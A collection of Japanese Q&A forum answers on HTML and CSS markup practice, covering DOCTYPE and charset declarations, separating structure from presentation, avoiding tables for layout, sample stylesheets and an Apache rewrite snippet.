まず、記述がそもそも間違ってます。 <styletype="text/css">ではなく<style type="text/css">です。（スペースが無い） これでとりあえずは直ると思います。 それと、cssを使う場合はhead内に下記を記述する事が推奨されています。 <meta http-equiv="Content-Style-Type" content="text/css" /> これは、要するにこの文書内でcssを使いますよというような宣言みたいなもので、 無くても大抵のブラウザは問題ないですが、一応念のために入れときましょう。 それと、きちんとcssでレイアウトしようと思うと、 結構記述が多くなるので、cssは外部ファイルして管理する事をお勧めします。 【例】 <link href="css/common.css" rel="stylesheet" type="text/css" /> この場合は、上のmetaの記述は必要ありません。 あと、ちゃんと記述するなら、1行目（htmlタグの前）にDTD宣言と呼ばれる記述が必要です。 これはどのバージョンのhtmlで記述しているか、という事をブラウザに認識させるための記述です。 例えばhtml 4.01のstrictなら <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> xhtml 1.0のtransitionalなら <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE html PUBLIC "-//W3C//DTDXHTML 1.0 Transitional//EN""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitio … （文字コードがutf-8の場合） html5なら <!DOCTYPE html> どのバージョンで記述しているか、把握しながら書きましょう。 例えばxhtmlで書いているなら、タグに大文字は使えません。 最後に、文字コードの指定がありませんので、環境によっては文字化けする可能性があります。 自分がどの文字コードで記述しているか把握して、その指定をhead内に記述しましょう。
　⇒Another HTML-lint 5( http://www.htmllint.net/html-lint/htmllint.html ) なら日本語で懇切丁寧に説明してくれます。 　右上のDATAタグでチェックするなら、サーバーになくても大丈夫です。 仕様書( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　→要素索引( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　　BODY( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　にて、 background = uri [CT] 推奨しない。 この属性の値は、画像資源を指し示すURIである。この画像は一般に、視覚系ブラウザで背景に敷き詰められる。 text = color [CI] 　　推奨しない。 この属性は、視覚系ブラウザでの、テキストの前景色を設定する。 link = color [CI] 　　推奨しない。 この属性は、視覚系ブラウザでの、未訪問ハイパーテキストリンクを示すテキストの色を設定する。 vlink = color [CI] 　　推奨しない。 この属性は、視覚系ブラウザでの、既訪問ハイパーテキストリンクを示すテキストの色を設定する。 alink = color [CI] 　　推奨しない。 この属性は、視覚系ブラウザでの、選択中ハイパーテキストリンクを示すテキストの色を設定する。 　とこれらはすべて非推奨です。 　可能なのはグローバル属性の %coreattrs 　　id class style title %i18n: 　　lang dir %events 　onclick ondblclick onmousedown onmouseup onmouseover onmousemove 　onmouseout onkeypress onkeydown onkeyup ですね。 　いずれにしても、HTML4.01strict,XHTML1.0strict,XHTML1.1、およびHTML5ではエラーにます。 　これらは、「HTMLのプレゼンテーション属性ではなくスタイルシートを使用すべきである。スタイルシートによる代替が可能なHTMLのプレゼンテーション属性は、推奨しないこととなった。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」-1999年ですから、将来的に、ほぼ完全に使うことができなくなると考えて良いでしょう。 　strictで作成し、スタイルシートでプレゼンテーションを指定していく開発方法にしましょう。
「google サイトマップ」で検索すれば、色々出てきますよ。
IEとの事ですが、 　⇒テーブルをスクロールさせるときのスクロールの位置 - HTML - 教えて！goo( http://oshiete.goo.ne.jp/qa/7105490.html ) で散々悩みましたが、結局あきらめました。 　リストでマークアップして、表形式に纏め上げるほうが楽です。 　上記リンクをよく読んでください。
これは、次の仕様によるものです。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 前略・・・HTMLでは、次に挙げる文字だけが空白類文字であると定義される。 　・ASCIIスペース (&#x0020;) 　・水平タブ (&#x0009;) 　・書式送り (&#x000C;) 　・ゼロ幅スペース (&#x200B;) 　行区切り類もまた、空白類文字である(が)・・・【中略】・・・HTMLでは行区切り類に含まれないし、更に本仕様は両者を空白類文字一般にも含めないという点に、注意されたい。 　ここで、ソース文書中で語間に空白類が複数連なっている場合、・・・【中略】・・・連続する空白類の入力があった場合は1つにまとめてしまう必要がある。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Paragraphs, Lines, and Phrases (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　これは、英文を考えると簡単に理解できると思います。\nは改行(見えないけどある)‐‐はタブとします。 <p> ‐‐Two roads diverged in a wood, and I- I took the one less traveled by, and\n ‐‐that has made all the difference. </p> 　HTMLでは、ディスプレイの幅に合わせて改行されなければなりませんから、 [幅広] Two roads diverged in a wood, and I- I took the one less traveled by, and that has made all the difference. [狭い] Two roads diverged in a wood, and I- I took the one less traveled by, and that has made all the difference. と整形されなければなりませんね。!!!　そのために左記のルールが生きてくるのです。 　もっとも良いのは、そのまま ‐‐<p> ‐‐‐‐いつもいつもありがとうございます。とても感謝しております。 ‐‐</p> と記述して、文字の折り返しを「ウィンドウ幅に合わせる」に設定して書いていくことです。 ＞エディタの幅を考えると、1行をエディタの幅で収めて、次の行に続きを書きたいと思っています。 　ウェブの理念からは、それはまずいのです。あくまでひとつの段落ですから、ひとつの段落は改行を入れずに記述するべきなのです。 ★これは単語境界を持たない日本語を使用する場合の問題でもあるのです。★ 　なお、「ユーザエージェントが開始タグ直後または終了タグ直前の空白類をレンダリングするとは期待しないようにすべきである。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」とあるように、 ‐‐<p>☆ ‐‐‐‐★いつもいつもありがとうございます。とても感謝しております。☆ ‐‐★</p> 　☆～★の間の改行コードやタブは描画されません。 ※ブラウザによって差があります。IEでは</p>前の改行コードやタブは空白文字としてカウントされてひとつになりますが、他のブラウザでは現れません。 (注)<p></p>は段落です。<p></p>じゃ行間が広すぎるので<br>で改行は誤りです。 p{text-indent:1em;margin:0;line-height:1.6em;} とする。
＞雛形の例を早速コピー新規テキストでタブを戻してプレビュー ＞確認しました。 ＞見出しが □ に化けてしまいます。 　文字コードの指定と、保存したテキストの文字コードが合ってないのです。 　^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ サンプルは、 <meta http-equiv="content-type" content="text/html; charset=UTF-8"> ですのでUTF-8で保存。 　Shift_JISで保存する場合は、 <meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> 　としなければなりません。 ※日本語の文字コードは、Shift_JIS(かってのWindows)、EUC-JP(UNIX)、ISO-2022JP、最近よく使われるUTF-8など色々あります。 ※今から学ばれるのでしたら、HTML4.01strictで学ばれることをお勧めします。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> <meta http-equiv="content-type" content="text/html; charset=UTF-8"> で始まります。
clear:bothしているのは先頭だからです。 なのでクラス設定を分ければよいでしょう <style> div.hoge1{ float:left; width:150px; } div.hoge2{ clear:both; } </style> <div class="hoge1 hoge2">1</div><div class="hoge1">1</div><div>IO</div> <div class="hoge1 hoge2">2</div><div class="hoge1">2</div><div>P1</div>
No.2です。読み返してみるとわかりにくいかもしれないので、HTML5的に説明しましょう。 <body>!-- HTML4.01の場合は、それぞれが<div class="header">になります。 　<header>略</header> 　<section> 　　<h2>HTML 4による文書の著述</h2> 　　<p>本仕様は、HTML 4で作業を行う著者並びに実装者に対し、次の一般原則に従うよう推奨する。</p> 　　<section> 　　　<h3>構造とプレゼンテーションの分離</h3> 　　　<p> 　　　　<abbr title="Hyper Text Markup Language">HTML</abbr>は、常に構造的マーク付けを規定するところの<abbr title="Standard Generalized Markup Language">SGML</abbr>をルーツに持っている。<abbr title="Hyper Text Markup Language">HTML</abbr>の性質上、プレゼンテーションに関する要素や属性は、次々と他の機構、とりわけ<a href="http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 …スタイルシート</a>に置換えられていく。 また、<em>文書の構造をプレゼンテーションと<strong>切り離すことで</strong>広汎なプラットフォームや多様なメディアでの文書提供コストを低下でき、文書の改訂も容易になるということが、経験的に知られている。</em> 　　　</p> 　　</section> 　　<section> 　　　<h3>広汎なWebアクセス性の考慮 </h3> 　　　<p> 　　　　・・・【中略】・・・ 　　　</p> 　　</section> 　</section> 　<footer>略</footer> </body> ＞スタイルシートでクラス名を宣言してbody内で使う場合は、クラス名だけ見てどんな動き--プレゼンテーション？---をするのかわからなくなってしまわないですか？ 　No.1さんが言われるように、そもそも順番が逆なのです。HTMLに必要なことは、上記のように徹底的に文書構造だけをマークアップするのです。 　だから、HTMLの段階ではどのようにプレゼンテーションするかは、まったくわからないのです。 　　　　　　　　　　　　　　^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 　なぜなら、どのようにプレゼンテーションするかのためにマークアップするのではないからです。 　一方のスタイルシートは、その文書構造を元に指定していくのです。 [例] section p{text-indent:1em;margin:0 1em;line-height:1.6em;} section p abbr{font-weight:bold;} 　スタイルシートを見るだけで、どのようにデザインされているかがわかります。 ★面白い例を見つけたので 　⇒ナビゲーションリストを様々にデザインしてみよう。( http://www.ichiya.com/WebService/Howto/sample/HT … ) 　1) まず、HTMLのソースを見る--極めてシンプル 　2) 印刷プレビューで印刷したらどうなるかを確認 　3) ブラウザの表示メニューのスタイルで、沢山あるスタイルのどれかを選択してみる。 ・文書構造とプレゼンテーションを分ける ・HTMLを見たってプレゼンテーションはわからない。わかるほうがおかしい。 が理解できますよね。
結果だけ先に言えばわからなかったのですが、一応検討してみた結果を書きますね。 まず、私のWin8のIE10環境だと投稿者様と同じように表示されていました。 そして、IE10の環境で複数のCSSを読み込めないのかどうかを試したところ、問題なく読み込むことができました。 どうやら（temcss/index/css/index.css）がIE10だと読み込めていないみたいなので、そのソースを丸々コピーして、新しく同じ名前、同じディレクトリでcssを作って読み込んだら正常に反映されてしまったこと。（この時点で名前の問題ではない） これらのことから、ファイル自体に何らかの問題があるのかな？エンコード指定ミスとか？ と思うので、 index.cssの内容をshare.cssにコピーして正常に表示されるかどうか確かめる。か、新たにcssを作ってみて読み込んでみると良いかとは思います。
参考にされているマニュアルがとっても古いようです。 これには理由があります。 人の目で追いやすい一行の文字数は、横書きで、60文字程度でしょう。 最近は、テレビや1900pxのような幅広のものから、スマホのように横幅600px程度、携帯電話の480px程度まで、様々なディスプレイが存在するために、最大幅を指定することが多くなりました。 　わざわざHTMLを使う理由は 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［HTML4.01仕様書( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　これらを考えれば、幅広ウィンドウでも適当な幅で表示されるように作成するほうが良いでしょう。 ★なお、 ＞テーブルの横幅も100％にしているし、 　tableはあくまで二次元以上のデータをマークアップするためのもので、デザインに使用すべきではありません。使用してはなりません。 ・単に文書内容を整形する目的だけで表を用いるべきでない。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) ・ページレイアウトの目的で表を用いる。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　と厳しい口調で指摘されていることです。1999年12月のHTML4.01の勧告以来!!!すでに13年経ってますから、さすがに今は、その形式で作成する人はないでしょう。 具体的には HTML5(まだ未勧告です) <body> 　<header>文書のヘッダ 　</header> 　<section> 　　本文 　</section> 　<footer> 　　フッタ(文書情報) 　</footer> </body> [HTML4.01] <body> 　<div class="header">文書のヘッダ 　</div> 　<div class="section"> 　　本文 　</div> 　<div class="footer"> 　　フッタ(文書情報) 　</div> </body> などになるでしょう。 　その上で下記サンプルのように指定するだけで、ウィンドウ幅の90%だけど、最小640px,最大900pxで中央に配置されるようになります。 ★文字コードはShift_JISです。タブは＿に置換してあるので戻すこと。 ★Another HTML-lint 5( http://www.htmllint.net/html-lint/htmllint.html# ) 　でチェック済みのHTML4.01strictです。右上のDATAタブでソースをチェックできます。 ★印刷プレビューで印刷の状況も確認すること。 ★ブラウザの表示メニューでスタイルシートなしにすると検索エンジンが見ている姿もわかる。 ★このようにHTMLにはデザイン的要素は何もないので、デザインはHTMLに手を加えることなく自由に変更できます。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css" media="screen"> <!-- html,body{margin:0;padding:0;} div.header,div.section,div.footer{width:90%;min-width:640px;max-width:860px;margin:0 auto;padding:10px 20px;} /* マージンや配置など */ h1,h2,h3,p{margin:0;line-height:1.6em;} div.section{position:relative;} div.section h2,div.section p{margin-left:200px;} div.section div.section{min-height:400px;width:auto;min-width:0;margin-left:200px;} div.section div.contentTable{position:absolute;top:10px;left:20px;width:190px;} div.section div.section p{margin-left:0;} /* わかりやすいように色づけ */ body{background-color:black;color:fuchsia;} div.header{background-color:green;} div.section{background-color:gray;} div.section div.section{background-color:blue;} div.footer{background-color:navy;} div.section div.contentTable{background-color:white;color:black;} --> ＿</style> ＿<style type="text/css" media="print"> <!-- body{color:black;} div.section div.section{margin-left:5em;min-height:10cm;} div.header{page-break-after:always;} div.section div.contentTable{page-break-before:always;} div.section div.contentTable ol li{position:relative;line-height:2em;} div.contentTable a:after{position:absolute;right:1em;} div.contentTable a[href="#section1"]:after{content:"・・P.2";position:absolute;right:1em;} div.contentTable a[href="#section2"]:after{content:"・・P.2";} --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section" id="SECTION1"> ＿＿<h2>見出し</h2> ＿＿<p>・・・</p> ＿＿<div class="section"> ＿＿＿<h3>第一章</h3> ＿＿＿<p>記事</p> ＿＿</div> ＿＿<div class="section" id="SECTION2"> ＿＿＿<h3>第二章</h3> ＿＿＿<p>記事</p> ＿＿</div> ＿＿<div class="contentTable"> ＿＿＿<h3>本文目次</h3> ＿＿＿<ol> ＿＿＿＿<li><a href="#SECTION1">一章</a></li> ＿＿＿＿<li><a href="#SECTION2">ニ章</a></li> ＿＿＿</ol> ＿＿</div> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2012-08-10</dd> ＿＿</dl> ＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿</div> </body> </html>
見るだけのウェブページであれば、半角片仮名サポートした文字コードでページを作り、charsetを適切に指定すれば、技術的な問題はありません。 単に、「汚い」というデメリットだけです。また、メリットもありませんが。 ページ内容を見るだけで無く、ダウンロードして加工されたり、コピペされたりすることを想定するなら、避けた方が良いでしょうね。 例えば、日本語メールで事実上の標準として使われている ISO-2022-JP という文字コードでは、半角片仮名は定義されていませんので、メールの本文にコピペして送ることはできません。無理矢理すると、メールソフトが日本語メールでの非標準の文字コード(UTF-8とか)に変換してしまい、環境によっては全文ごと読めなくなります。
　これは、No.がある序列リストですか？あるいは、用語とその説明のようなものでしょうか？ 　HTMLは、その文書構造を記述するだけですので、それにしたがってマークアップすれば良いです。 [例]［用語とその説明のようなもの］のようですから定義リストでマークアップしてみましょう。 <h3>元素</h3> <dl class="periodic table"> <dt>水素</dt> <dd>元素記号(H)、原子量1.008、酸素と共に水をくつる。</dd> <dt>ヘリウム</dt> <dd>元素記号(He)、原子量4.003、不活性ガス</dd> <dt>リチウム</dt> <dd>元素記号(Li)、原子量6.941、リチウムイオン電池</dd> </dl> <h3>元素</h3> <ol class="periodic table"> <li><span class="element">水素</span>元素記号(H)、原子量1.008、酸素と共に水をくつる。</li> <li><span class="element">ヘリウム</span>元素記号(He)、原子量4.003、不活性ガス</li> <li><span class="element">リチウム</span>元素記号(Li)、原子量6.941、リチウムイオン電池</li> </ol> これに対して、スタイルシートを次のように書いたりします。 dl.periodic.table{counter-reset: atomicNum 0;padding-left:2em;} dl.periodic.table dt{float:left;font-weight:bold;} dl.periodic.table dt:before{ content: counter(atomicNum) ". "; counter-increment: atomicNum; } dl.periodic.table dd{margin-left:7em;} dl.periodic.table dd:before{content:": ";} ol.periodic.table span.element{float:left;width:7em;position:relative;font-weight:bold;} ol.periodic.table span.element:before{content:": ";position:absolute;right:0.5em;} ★他にどのようにマークアップされていても、用語とその説明がが区別できるようにマークアップされていれば、デザインはできます。 ★デザインのためにDIVやSAPNを追加しているわけではありません。 『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』ものです。デザインのために書いてしまうと、デザインのためにtableを使ったのと大差ありません。 　HTML5では、 ※DIVやSPANは他に適した要素がないときのための最後の手段 ※文書構造を示すため 　となります。
原因はわかりかねますが、あまり経験したことのないトラブルですね。 　ひょっとして分岐処理を間違っているのでは 私は、フォームに関しては基本的に下記のフローで作成します。 プログラムの呼び出し 　フォーム入力なし　→　(1)フォーム出力 　フォーム入力あり 　　確認済み値あり　→　データ処理　→　完了メッセージ出力 　　確認メッセージなし　→　(1)フォームデータ記入済みフォーム出力 としています。 　フォーム自体もこのCGIから出力させるようにしています。そうする事でフォーム値があればそれを含めて表示しますし、なければ初期フォームの形で出力されます。 　それを受け取ると、入力漏れのエラーがあると、その部分を朱記したフォームを再出力、確認済み値がないと確認画面を表示します。 　確認画面自体もフォーム値を引き継いでいますから、送信するとデータ処理して完了、なければ再びフォームに値を入れた状態で出力 　としています。
何の表でしょうか？？ 　そういう表もあって良いでしょう。 ★★ただし、それが表だったらですよ!!!!★★ 　もし、表でなくデザインのためでしたら、一重であってもtableを使ってはなりません。 　これは、1999年のHTML4.01の勧告以来、名指しで否定されていることです。 『　⇒単に文書内容を整形する目的だけで表を用いるべきでない。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 『　⇒ページレイアウトの目的で表を用いる。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　すでに14年近く前から、言われ続けていることです。 　^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 　HTMLを作成する上で、最も避けなければならない基本中の基本です。 　初学者でしたら、けっして参考にしてはならない見本だと思ってください。
具体的な例を <div class="header"> 　<h1>ページタイトル</h1> 　<p class="goTop"><a href="/">トップへ</a></a> ・・・ </div> だったとします。A要素はブロックに入ります。<div>だと文法的には合致していますが、文書構造上はおかしいので・・ p.goTop{ width:900px;height:210px; position:absolute;top:0;left:0; } div.header h1{ margin-top:210px; } p.goTop a{ display: block; width: 100%;height:100%; background-image: url("../images/main/img_header.jpg") top left no-repeat; text-indent:10em; overflow:hidden; } p.goTop a:hover { background-position:bottom left; } ・・・ @media print{ p.goTop a:before{ content:url("../images/main/img_header_bottom.jpg"); position:absolute;top:0;left:0; } } 以上、試してません 　なお、リキッドデザインで中央に表示したいならpを配置した後、a要素を内部でmargin:0 autoですかね。
同じサーバーの/home/example配下で２つのドメインを別々の内容で共存と言うことでしょうか。 質問に書いてある記述が場所により違い、矛盾してるので何をしたいか不明ですが、アドバイスとしては、サンプルだけ書いておきます。 ・R=301をつけると、ブラウザが書き換えられたURLで再度アクセスするので、同じ条件にはまって、ループするので、リダイレクトで無く単にパスの書き換えでOK サンプル： RewriteRule (.*) /NEW/$1 [L] ・ドメイン1とドメイン２を区別してそれぞれに異なったリライトが必要 サンプル： RewriteCond %{HTTP_HOST} !^www.example1.com$
判断は、「どちらでもかける場合があります」ではありませんよ。 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 　「構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」という根本を理解していないと、この質問になります。 　HTMLは、あくまで文書構造をマークアップするものです。例えば、太字で表示したい語句があったとします。 [例文] 　「構造とプレゼンテーションの分離」という概念を理解しておかなければなりません。 　いにしえの昔の武士の侍が、馬から落ちて落馬して、・・・【中略】・・・腹を切って切腹した。 　ここで、「構造とプレゼンテーションの分離」が重要なのでしたら <p> 　<strong>「構造とプレゼンテーションの分離」</strong>という概念を理解しておかなければなりません </p> でしょうし <p> 　<b>いにしえ</b>の<b>昔</b>の<b>武士</b>の<b>侍が、<b>馬から落ちて</b><b>落馬</b>して、・・・【中略】・・・<b>腹を切って</b><b>切腹</b>した。 </p> 　でしょう。 　その上で、スタイルシートで p strong{color:red;font-weight:normal;} p b{color:green;font-weight:normal;text-decoration:underline;} とか・・ 　しかし、すくなくとも <p> 　<span class="stong">「構造とプレゼンテーションの分離」</span>という概念を理解しておかなければなりません </p> とかいて p span.strong{font-weight:bold;color:red;} とするのは、望ましくはありません。 　もっと、良く指摘されるのが、配置をtableを使って行うことです。tableは、二次元以上のデータをマークアップするものですが、これを他の用途に使うのは誤りです。 　それぞれのタグの用途は仕様書に書かれています。 　⇒要素索引( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　から要素名をクリックして説明を読んでください。 ＞その際どちらを使ったほうがいいのでしょうか？ 　それは、その要素が何であるかがわからないので、一概には答えられません。--これもわかると思います。 　HTMLは、その文書を読み解き、その文書を構成する要素に分解して、それぞれの要素をタグでマークアップしていく言語です。文書を書く本人しか、その要素(部品)をどの要素とは判断できないのです。 　そのうえで、スタイルシートで自由にプレゼンテーションを変更できる。 　^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ と考えたら答えは出ると思います。 (注)HTML4.01では、この文書構造を示すタグ--要素が足りませんでした。そのため、DIV,SAPNという要素が用意されて 『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　とされていましたが、ご存知の通りこれが正しく理解されずに<div id="wrapper"><div id="contener"><div id="Left">のようなおかしなマークアップが氾濫してしまいました。本来は、<div class="article"><div class="section"><div class="nav">のようになるはずでした。 　その反省から、「HTML5 では、文書をよりよく構造化するために、( http://standards.mitsue.co.jp/resources/w3c/TR/h … )」header,section,footerなどの新しい要素が採用され、DIVやSPANは原則使わない--他に適当な要素がないときの最後の手段となりました。 ＞その際どちらを使ったほうがいいのでしょうか？ 　これで悩むことがありませんよう、役立てば良いです。 　1度仕様書を通しで読んでみましょう。答えはそこにあります。
端的にいえば、type=buttonはスクリプトを前提とするタグなので スクリプトのトリガーとしての意味合いから言えば必ずしもformとの 組み合わせでなくてもよいかと思います。 ただしbodyに直書きするのはどうかとおもうので最低限pタグなどで 囲んであげてください(form内に設置する場合もおなじ)
＞ごめんなさい「あまりにも量が多い」と言うのは「引き継いだ量が多いのでと・・・」 　そうなんですか？？ 　私は、それが仕事なので、確かに他人の書いた糞--失礼---を直すのは大変です。 　結局、私が示ししたように、コツコツ地道に直していくしかありません。修正方法は、サンプルを参考にしてください。そして、二つを提示してその作業が以下に大変かを理解してもらうしかありませんね。 　ただ、ごらんのようにHTMLもスタイルシートも数分の一、データ転送量は数十分の一になります。 　私は対価を頂くのですが、やはり苦痛です。・・そうでないとしたら投げ出したくなりますよね。重要なところから徐々に直しましょう。 　⇒Another HTML-lint 5( http://www.htmllint.net/html-lint/htmllint.html ) の[DATA]タブを使うと楽ですよ。あまりにエラーが多ければ、とりあえず The W3C Markup Validation Service( http://validator.w3.org/#validate_by_input ) やfirefoxのHTML Validator( https://addons.mozilla.jp/firefox/details/249 )を使って、重要なものだけでも
一応補足です。 枠線の太さを０にして見えなくするのではなく、「透明」にするのであれば、色をtransparentにしてください。 border: 1px solid transparent; 今のブラウザならtransparentに対応していると思います。
まず、ブロック要素とインライン要素があることを理解しておくこと。 　⇒7.5.3 ブロックレベル要素と行内要素( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　ついでスタイルシートのdisplayプロパティを用いて、他のタイプに変更できること 　⇒9.2.5 'display'プロパティ（The 'display' property）( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) 【注意】現行のCSS2.1は、大きく変更になっています。 inline | block | list-item | inline-block | table | inline-table | table-row-group | table-header-group | table-footer-group | table-row | table-column-group | table-column | table-cell | table-caption | none | inherit 　A要素はインライン要素ですから、ブロック要素の内部に書いてあります。例えば <p class="link"> 　<a href="/">Top</a> </p> でしたら、 p.link{ width:100px; height:100px; position:relative; text-align:center; margin:0 auto; } p.link a{ display:block; border:outset 3px gray; line-height:100px; text-decoration:none; width:100%; height:100%; background-color:yellow; } p.link a:visited{background-color:silver;} p.link a:hover{background-color:aqua;} p.link a:active{border-style:inset;} とか・・お好きにどうぞ
そもそもHTMLがわからないと・・ その丸印はリンクか何かですか？ 他のコンテンツは何でしょう。 例えば、リンクだとすると <p class="goTopPage"> 　<a href="/">Top</a> </p> という部分について、画像の中心のある区域に:hoverすると画像が変わる。 クリックするとサイトトップに飛ぶとか・・・
<div style="text-align:center;font-size:80%;"> aaaaaaaaaa <div> styleに1つにまとめる。
HTMLのdir属性は文字方向を指定する属性です。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから dir = LTR | RTL [CI] 　この属性は、当該要素内容及び属性値における、方向性について中立なテキスト(すなわち、 [UNICODE]が定義する固有の方向性を持たないテキスト)の、基本方向を指定する。 この値はまた、表の方向性についても指定する。 　可能な値は次の通り。 　・LTR: 左から右の、テキストあるいは表。 　・RTL: 右から左の、テキストあるいは表。 　文書の言語をlang属性で指定するのに加えて、著者は、文書のテキストや表の構成に関する基本方向(左-右か、右-左か)をも指定する必要があり得よう。 方向性の指定は、dir属性によって行う。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Language information and text direction (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　dir="LTR" は初期値ですから記入しなくて良いですがlang属性は入れるべきです。仕様書ではなくWAIで定められています。 <HTML lang="ja"> <HTML lang="ja-JP"> の何れかを書いてください。 　なお、最初に 　⇒はじめてのWebドキュメントづくり( http://www.asahi-net.or.jp/%7Esd5a-ucd/www/ ) を一通り学ばれたのち 　⇒HTML 4.01仕様書( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　に目を通されて、必要なとき必要な情報が得られるようにすること。 　書いたら 　⇒Another HTML-lint 5( http://www.htmllint.net/html-lint/htmllint.html ) 　で右上のDATAタブを選択して、チェックすることを繰り返すと上達の早道でしょう。 　今から学ばれるなら、HTML4.01strictを徹底的に身につけて、その後HTML5を学ばれるのが良いと思います。 　⇒HTML5 における HTML4 からの変更点( http://standards.mitsue.co.jp/resources/w3c/TR/h … )
＞こちらのサイトで質問したり過去の質問を参考にしたりと頑張っておりますが、 　そんなもの当てになりません。限られた答えしか出来ないし、正確でない情報のほうが多いくらいです。 　まず仕様書を確認しましょう。 　⇒17 フォーム( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　フォーム自体は、 <tr> 　<td>ご意見/ご要望など</td> 　<td><textarea width="20" height="10" name="message"><br>最大200文字</td> </tr> <tr> 　<td>その他</td> 　<td><textarea width="20" height="10" name="message2"><br>最大200文字</td> </tr> 　<td>その他</td> 　<td><textarea width="20" height="10" name="message2"><br>最大200文字</td> </tr> <tr> 　<td>希望時間など</td> 　<td><select name="time"><option>12:00<option>13:00</select></td> </tr> <tr> 　<td>ご感想</td> 　<td><select name="aaa"><option>非常に良い<option>普通</select></td> </tr> 　とかでよいです。 　時刻がありますし、確認の問題もあるので、フォーム自体もCGIから主欝力させることになるでしょう。javascriptを併用して文字数をカウントし、確認時にサイドチェックすると良いでしょう． 　送信されるデータは、メール送信用CGIで処理されますから、そちらに手を加える必要があります。色々な状況を考えるとHTMLメールではなく、通常のテキストで送信することになりますが、メールの本文は改行の問題があります。 ★RFC5322( http://tools.ietf.org/html/rfc5322 )の§2.1.1で「78文字以下でなければなない(SHOULD)」と定められています。これは半角英数文字ででの文字数ですので、日本語では「39文字以下」で折り返さなければなりません。 　⇒AL-Mailの重大な欠点( http://cse.ffpri.affrc.go.jp/akema/sec_net/AL-Ma … ) 　⇒メールアドレスの正規表現( http://www.din.or.jp/~ohzaki/mail_regex.htm ) 　また半角カタカナと使えないので全角に直す。 　めるアドレスの正当性をチェック 　これらの処理が意外と厄介です。日本語や半角文字が混在するテキストを文字数を数えて正確に３７文字で折り返すのは、結構大変なのです。 　⇒特定の長さで折り返す( http://www.din.or.jp/~ohzaki/perl.htm#JP_Fold )
